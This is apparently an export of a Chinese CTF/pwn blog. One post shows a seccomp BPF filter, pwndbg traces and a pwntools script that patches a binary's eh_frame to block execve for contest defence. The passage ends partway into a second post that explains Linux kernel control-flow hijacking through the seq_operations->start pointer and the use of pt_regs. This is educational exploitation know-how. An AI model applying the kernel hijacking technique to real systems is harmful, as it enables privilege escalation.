<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这条指令会返回
<code>SECCOMP_RET_ALLOW</code>，表示允许其他系统调用正常执行。</li>
</ul>
<h4 id="struct-sock_fprog-prog"><strong>struct sock_fprog
prog</strong></h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">    .filter = filter</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>struct sock_fprog</code> 是一个包含 seccomp
过滤器程序的结构体：
<ul>
<li><code>len</code> 表示 <code>filter</code>
数组的长度（指令数量）。通过
<code>sizeof(filter) / sizeof(filter[0])</code>
来计算过滤器中有多少条指令。</li>
<li><code>filter</code> 是一个指向 <code>sock_filter</code>
数组的指针，用于存储 seccomp 过滤器的指令集。</li>
</ul></li>
</ul>
<p>该结构体用于将 BPF 过滤器指令加载到内核中。</p>
<h4 id="prctl-系统调用"><strong>prctl 系统调用</strong></h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>prctl</code> 是用来对进程的某些属性进行设置的系统调用。</li>
<li><code>PR_SET_SECCOMP</code> 是用于启用 seccomp 的选项。</li>
<li><code>SECCOMP_MODE_FILTER</code> 表示以过滤模式运行
seccomp，意味着我们会使用 BPF
过滤器来决定哪些系统调用可以执行，哪些会被拒绝。</li>
<li><code>&amp;prog</code>
是指向我们定义的过滤器程序的指针，它告诉内核使用这个过滤器来限制系统调用。</li>
</ul>
<p>如果 <code>prctl</code> 调用失败，意味着 seccomp
设置失败，会输出错误信息并终止进程。</p>
<p>这里其实也可以把SECCOMP_MODE_FILTER改成 SECCOMP_MODE_STRICT
，然后就不用构建并传prog了，这样一来会仅仅允许exit，sigreturn，read以及write的系统调用。</p>
<p>其中BPF_STMT与BPF_JUMP实际上是一个宏定义，是条件编译后赋值的sock_filter结构体，这就是为什么<code>struct sock_filter filter[]</code>这个声明是声明结构体数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p>而sock_filter的结构体定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span></span><br><span class="line">    __u16   code;   <span class="comment">/* BPF opcode */</span></span><br><span class="line">    __u8    jt;     <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8    jf;     <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32   k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h4 id="其他一些常用的宏定义">其他一些常用的宏定义</h4>
<p>基本都是位掩码，只需要知道其代表的含义即可。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主指令类别（2 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LD          0x00  <span class="comment">// Load</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LDX         0x01  <span class="comment">// Load with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ST          0x02  <span class="comment">// Store</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STX         0x03  <span class="comment">// Store with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU         0x04  <span class="comment">// ALU (arithmetic logic unit) operation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP         0x05  <span class="comment">// Jump</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MISC        0x07  <span class="comment">// Miscellaneous</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 操作码的大小（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_W           0x00  <span class="comment">// Word (32-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_H           0x08  <span class="comment">// Half-word (16-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_B           0x10  <span class="comment">// Byte (8-bit)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载/存储操作的模式（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IMM         0x00  <span class="comment">// Immediate value</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ABS         0x20  <span class="comment">// Absolute</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IND         0x40  <span class="comment">// Indirect</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MEM         0x60  <span class="comment">// Memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LEN         0x80  <span class="comment">// Packet length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MSH         0xA0  <span class="comment">// Modulo shift</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算和比较操作的源（1 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_K           0x00  <span class="comment">// Constant</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_X           0x08  <span class="comment">// Register</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ALU 运算符（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ADD         0x00  <span class="comment">// Addition</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SUB         0x10  <span class="comment">// Subtraction</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MUL         0x20  <span class="comment">// Multiplication</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_DIV         0x30  <span class="comment">// Division</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OR          0x40  <span class="comment">// Bitwise OR</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_AND         0x50  <span class="comment">// Bitwise AND</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LSH         0x60  <span class="comment">// Left shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RSH         0x70  <span class="comment">// Right shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_NEG         0x80  <span class="comment">// Negation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MOD         0x90  <span class="comment">// Modulo</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_XOR         0xA0  <span class="comment">// Bitwise XOR</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转条件（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JA          0x00  <span class="comment">// Jump unconditionally</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JEQ         0x10  <span class="comment">// Jump if equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGT         0x20  <span class="comment">// Jump if greater than</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGE         0x30  <span class="comment">// Jump if greater or equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JSET        0x40  <span class="comment">// Jump if bits are set</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return 操作码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL 0x00000000  <span class="comment">// Kill process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ALLOW 0x7fff0000 <span class="comment">// Allow syscall</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对seccomp mode 进行操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP     22</span></span><br></pre></td></tr></table></figure></div>
<h3 id="二调试获取汇编写法">二、调试获取汇编写法</h3>
<p>查看pwndbg，install_seccomp()函数的主逻辑如下，我们可以发现除了prctl系统调用外，前面的一系列结构体的初始化都没有调用函数，而且这一大通操作实际上很多是一个一个字节进行的修改，那么我们在eh_frame空间有限的情况下，实际可以通过8字节直接赋值参数来节省掉许多指令字节。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5555555551e4 &lt;install_seccomp+27&gt;    mov    word ptr [rbp - 0x30], 0x20     [0x7fffffffe450] =&gt; 0x20</span><br><span class="line">0x5555555551ea &lt;install_seccomp+33&gt;    mov    byte ptr [rbp - 0x2e], 0        [0x7fffffffe452] =&gt; 0</span><br><span class="line">0x5555555551ee &lt;install_seccomp+37&gt;    mov    byte ptr [rbp - 0x2d], 0        [0x7fffffffe453] =&gt; 0</span><br><span class="line">0x5555555551f2 &lt;install_seccomp+41&gt;    mov    dword ptr [rbp - 0x2c], 0       [0x7fffffffe454] =&gt; 0</span><br><span class="line">0x5555555551f9 &lt;install_seccomp+48&gt;    mov    word ptr [rbp - 0x28], 0x15     [0x7fffffffe458] =&gt; 0x15</span><br><span class="line">0x5555555551ff &lt;install_seccomp+54&gt;    mov    byte ptr [rbp - 0x26], 0        [0x7fffffffe45a] =&gt; 0</span><br><span class="line">0x555555555203 &lt;install_seccomp+58&gt;     mov    byte ptr [rbp - 0x25], 1               [0x7fffffffe45b] =&gt; 1</span><br><span class="line">0x555555555207 &lt;install_seccomp+62&gt;     mov    dword ptr [rbp - 0x24], 0x3b           [0x7fffffffe45c] =&gt; 0x3b</span><br><span class="line">0x55555555520e &lt;install_seccomp+69&gt;     mov    word ptr [rbp - 0x20], 6               [0x7fffffffe460] =&gt; 6</span><br><span class="line">0x555555555214 &lt;install_seccomp+75&gt;     mov    byte ptr [rbp - 0x1e], 0               [0x7fffffffe462] =&gt; 0</span><br><span class="line">0x555555555218 &lt;install_seccomp+79&gt;     mov    byte ptr [rbp - 0x1d], 0               [0x7fffffffe463] =&gt; 0</span><br><span class="line">0x55555555521c &lt;install_seccomp+83&gt;     mov    dword ptr [rbp - 0x1c], 0              [0x7fffffffe464] =&gt; 0</span><br><span class="line">0x555555555223 &lt;install_seccomp+90&gt;     mov    word ptr [rbp - 0x18], 6               [0x7fffffffe468] =&gt; 6</span><br><span class="line">0x555555555229 &lt;install_seccomp+96&gt;     mov    byte ptr [rbp - 0x16], 0               [0x7fffffffe46a] =&gt; 0</span><br><span class="line">0x55555555522d &lt;install_seccomp+100&gt;    mov    byte ptr [rbp - 0x15], 0               [0x7fffffffe46b] =&gt; 0</span><br><span class="line">0x555555555231 &lt;install_seccomp+104&gt;    mov    dword ptr [rbp - 0x14], 0x7fff0000     [0x7fffffffe46c] =&gt; 0x7fff0000</span><br><span class="line">0x555555555238 &lt;install_seccomp+111&gt;    mov    word ptr [rbp - 0x40], 4               [0x7fffffffe440] =&gt; 4</span><br><span class="line">0x55555555523e &lt;install_seccomp+117&gt;    lea    rax, [rbp - 0x30]                      RAX =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555242 &lt;install_seccomp+121&gt;    mov    qword ptr [rbp - 0x38], rax            [0x7fffffffe448] =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555246 &lt;install_seccomp+125&gt;    lea    rax, [rbp - 0x40]                      RAX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524a &lt;install_seccomp+129&gt;    mov    rdx, rax                               RDX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524d &lt;install_seccomp+132&gt;    mov    esi, 2                                 ESI =&gt; 2</span><br><span class="line">0x555555555252 &lt;install_seccomp+137&gt;    mov    edi, 0x16                              EDI =&gt; 0x16</span><br><span class="line">0x555555555257 &lt;install_seccomp+142&gt;    mov    eax, 0                                 EAX =&gt; 0</span><br><span class="line">0x55555555525c &lt;install_seccomp+147&gt;    call   prctl@plt                   			  &lt;prctl@plt&gt;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151136186.png"
                      class=""
                >
<p>最后整个prog结构体的地址是存在rdx中，也就是rbp -
0x40这个地址处。但之后遇到了问题，在prctl函数的实现中，在prctl的系统调用时始终不成功，返回的rax代表的错误码。之后尝试直接执行test，发现是权限问题。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151151584.png"
                      class=""
                >
<p>这下尴尬了，本来想上沙箱是为了方便防御，这么一来二去搞awd前还得提权，更加麻烦了，这下就只能算是学习沙箱实现的机制了。那么我们得切到root用户进行调试（本来想setuid改文件，但好像wsl不支持），进到prctl具体实现里看看。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7eae338</span> &lt;prctl+<span class="number">8</span>&gt;        mov    r10, rcx                        R10 =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae33b</span> &lt;prctl+<span class="number">11</span>&gt;       mov    qword ptr [rsp + <span class="number">0x28</span>], rsi     [<span class="number">0x7fffffffe408</span>] =&gt; <span class="number">2</span></span><br><span class="line"><span class="number">0x7ffff7eae340</span> &lt;prctl+<span class="number">16</span>&gt;       mov    qword ptr [rsp + <span class="number">0x30</span>], rdx     [<span class="number">0x7fffffffe410</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae345</span> &lt;prctl+<span class="number">21</span>&gt;       mov    qword ptr [rsp + <span class="number">0x38</span>], rcx     [<span class="number">0x7fffffffe418</span>] =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae34a</span> &lt;prctl+<span class="number">26</span>&gt;       mov    qword ptr [rsp + <span class="number">0x40</span>], r8      [<span class="number">0x7fffffffe420</span>] =&gt; <span class="number">0x7ffff7fa3f10</span> (initial+<span class="number">16</span>) ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae34f</span> &lt;prctl+<span class="number">31</span>&gt;       mov    rax, qword ptr fs:[<span class="number">0x28</span>]        RAX, [<span class="number">0x7ffff7d85768</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae358</span> &lt;prctl+<span class="number">40</span>&gt;       mov    qword ptr [rsp + <span class="number">0x18</span>], rax     [<span class="number">0x7fffffffe3f8</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae35d</span> &lt;prctl+<span class="number">45</span>&gt;    xor    eax, eax                        EAX =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae35f</span> &lt;prctl+<span class="number">47</span>&gt;    lea    rax, [rsp + <span class="number">0x60</span>]               RAX =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae364</span> &lt;prctl+<span class="number">52</span>&gt;    mov    dword ptr [rsp], <span class="number">8</span>              [<span class="number">0x7fffffffe3e0</span>] =&gt; <span class="number">8</span></span><br><span class="line"><span class="number">0x7ffff7eae36b</span> &lt;prctl+<span class="number">59</span>&gt;    mov    qword ptr [rsp + <span class="number">8</span>], rax        [<span class="number">0x7fffffffe3e8</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae370</span> &lt;prctl+<span class="number">64</span>&gt;    lea    rax, [rsp + <span class="number">0x20</span>]               RAX =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae375</span> &lt;prctl+<span class="number">69</span>&gt;    mov    qword ptr [rsp + <span class="number">0x10</span>], rax     [<span class="number">0x7fffffffe3f0</span>] =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae37a</span> &lt;prctl+<span class="number">74</span>&gt;    mov    eax, <span class="number">0x9d</span>                       EAX =&gt; <span class="number">0x9d</span></span><br><span class="line"><span class="number">0x7ffff7eae37f</span> &lt;prctl+<span class="number">79</span>&gt;    syscall  &lt;SYS_prctl&gt;</span><br></pre></td></tr></table></figure></div>
<p>最后syscall时rdi为0x16，rsi为2，rdx为0x7fffffffe440（prog结构体地址），前面的操作用处不大，就是把寄存器参数加载到了栈上以及存了下canary。r10用rcx赋值，r8不变。那么我们只要把那个结构体伪造出来，就可以直接syscall来禁用一些系统调用。理论可行，开始手搓。</p>
<p>我们可以拿一道简单的栈溢出来试一下，更改程序我用的是
https://github.com/aftern00n/AwdPwnPatcher 这个库，我们可以把call init
patch成一个跳转到ehframe段执行，再在ehframe段最后手动加上call
init。AwdPwnPatcher中有个add_constant_in_ehframe方法，其中会将传入的字符串转换为字节字符串。我感觉还是直接在传参前用p64伪造好结构体的各字段比较方便，所以就把库里面字符串的encode逻辑给注释掉了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151211381.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151222496.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line">sock_filter = p64(<span class="number">0x20</span>) + p64(<span class="number">0x3b01000015</span>) + p64(<span class="number">6</span>) + p64(<span class="number">0x7fff000000000006</span>)</span><br><span class="line">sock_filter_addr = awd_pwn_patcher.add_constant_in_ehframe(sock_filter)</span><br><span class="line"></span><br><span class="line">prog = p64(<span class="number">4</span>) + p64(sock_filter_addr)</span><br><span class="line">prog_addr = awd_pwn_patcher.add_constant_in_ehframe(prog)</span><br><span class="line"></span><br><span class="line">assembly = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,157</span></span><br><span class="line"><span class="string">    mov rdi,22</span></span><br><span class="line"><span class="string">    mov rsi,2</span></span><br><span class="line"><span class="string">    lea rdx,[<span class="subst">&#123;prog_addr&#125;</span>]</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call 0x40117A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">awd_pwn_patcher.patch_by_jmp(jmp_from=<span class="number">0x4011F0</span>,jmp_to=<span class="number">0x4011F5</span>,assembly=assembly)</span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure></div>
<p>这时候本来充满期待开始调试二进制程序，但是首先遇到的问题是ehframe段不可执行，一般来说awd_pwn_patcher.save()时会自动把这个段设为可执行，但这里不知道出了什么问题，得自己手动来。根据https://blog.csdn.net/qq_46106285/article/details/124972056
这篇博客能够成功地设置段权限。第二个问题是我在root用户下安装pwntools后，发现会让正常用户gdb调试时出现问题，这个问题的解决方案是起一个python的虚拟环境给root用，或者是<code>sudo pip install --user pwntools</code>来指定只给root用户安装python库。之后运行就不会出现问题了。</p>
<p>运行没有patch过的程序：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151236768.png"
                      class=""
                >
<p>经过patch之后：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151247626.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151256919.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151305738.png"
                      class=""
                >
<p>经过计算，构造禁用execve沙箱所用的仅有0x53字节，一般而言ehframe段还是够用的，每个多加的规则也只会多出8字节的开销，改一下结构体的参数就行。但由于前提是要有root权限执行程序，也是挺鸡肋的。</p>
<h3 id="三自动化工具">三、自动化工具</h3>
<p>感觉这个挺有意思的，感觉逻辑也挺简单，上头了小写一手自动化工具（虽然没有什么卵用）</p>
<p>效果图：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151317438.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151328087.png"
                      class=""
                >
<p>https://github.com/collectcrop/SandboxAttacher</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>seq_operations搭配pt_regs的kernel利用手法</title>
    <url>/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<h2
id="seq_operations搭配pt_regs的kernel利用手法">seq_operations搭配pt_regs的kernel利用手法</h2>
<h4 id="seq_operations简介">seq_operations简介</h4>
<p><code>seq_operations</code> 是 Linux
内核中的一个结构体（<code>struct seq_operations</code>），用于实现
<strong>seq_file</strong> 机制。<code>seq_file</code>
机制提供了一种统一的方式来访问可变长度的数据，主要用于
<code>/proc</code> 文件系统，以简化内核导出信息的操作。</p>
<p><code>struct seq_operations</code> 主要包含以下函数指针：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>start</code>：用于迭代的初始化，返回第一个数据项的指针。</li>
<li><code>stop</code>：迭代结束时执行的清理工作。</li>
<li><code>next</code>：返回下一个数据项的指针，并更新偏移量
<code>pos</code>。</li>
<li><code>show</code>：将数据格式化并写入 <code>seq_file</code>
结构。</li>
</ul>
<p>在用户态执行<code>open("/proc/self/stat",0);</code>后，内核中的调用过程如下图所示：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20221231182402133.png"
                      class=""
                >
<p>内核中会调用<a class="link" 
 href="https://elixir.bootlin.com/linux/v4.4.72/source/fs/seq_file.c#L565" >single_open()<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>函数，而该函数中会为<a class="link" 
 href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/seq_file.h#L36" >struct
seq_operations<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 结构体申请一段内存空间（0x20字节大小）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">single_open</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">int</span> (*show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *),</span></span><br><span class="line"><span class="params">		<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span> =</span> kmalloc(<span class="keyword">sizeof</span>(*op), GFP_KERNEL);</span><br><span class="line">	<span class="type">int</span> res = -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (op) &#123;</span><br><span class="line">		op-&gt;start = single_start;</span><br><span class="line">		op-&gt;next = single_next;</span><br><span class="line">		op-&gt;stop = single_stop;</span><br><span class="line">		op-&gt;show = show;</span><br><span class="line">		res = seq_open(file, op);</span><br><span class="line">		<span class="keyword">if</span> (!res)</span><br><span class="line">			((<span class="keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			kfree(op);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>open()</code>操作后，用户态获得一个文件描述符fd。当用户态对该fd进行读操作<code>read(fd,buf,size)</code>时，在内核中会调用<code>seq_operations-&gt;start</code>函数指针，内核调用栈如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20221231185654243.png"
                      class=""
                >
<p>如果利用漏洞改掉结构体中的start函数指针，就能实现控制流劫持。</p>
<p><code>seq_operations</code>
结构体中含有4个内核函数指针，我们可能借此进行地址的泄露，从而绕过kaslr。</p>
<h4 id="pt_regs介绍">pt_regs介绍</h4>
<p>内核栈<strong>只有一个页面的大小</strong>，而 pt_regs
结构体则固定位于<strong>内核栈栈底</strong>，当我们劫持内核结构体中的某个函数指针时（例如
seq_operations-&gt;start），在我们通过该函数指针劫持内核执行流时
<strong>rsp 与 栈底的相对偏移通常是不变的</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span 